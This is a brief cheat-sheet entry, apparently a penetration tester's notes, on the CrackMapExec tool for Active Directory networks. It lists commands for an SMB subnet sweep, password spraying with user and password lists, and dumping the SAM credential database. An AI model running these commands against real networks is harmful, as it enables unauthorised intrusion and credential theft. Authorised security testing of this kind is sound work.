---
title: CME
tags:
  - Enumeration
  - Post-exploitation
---

A powerful post-exploitation tool used for auditing and assessing large Active Directory networks.

```Bash Sweep scan
crackmapexec smb $ip/24
```

---

```Bash Password Spraying
crackmapexec smb -U user.txt -P pass.txt $ip
```

---

```bash Dump sam database
crackmapexec smb -U $user -P $password --sam
```

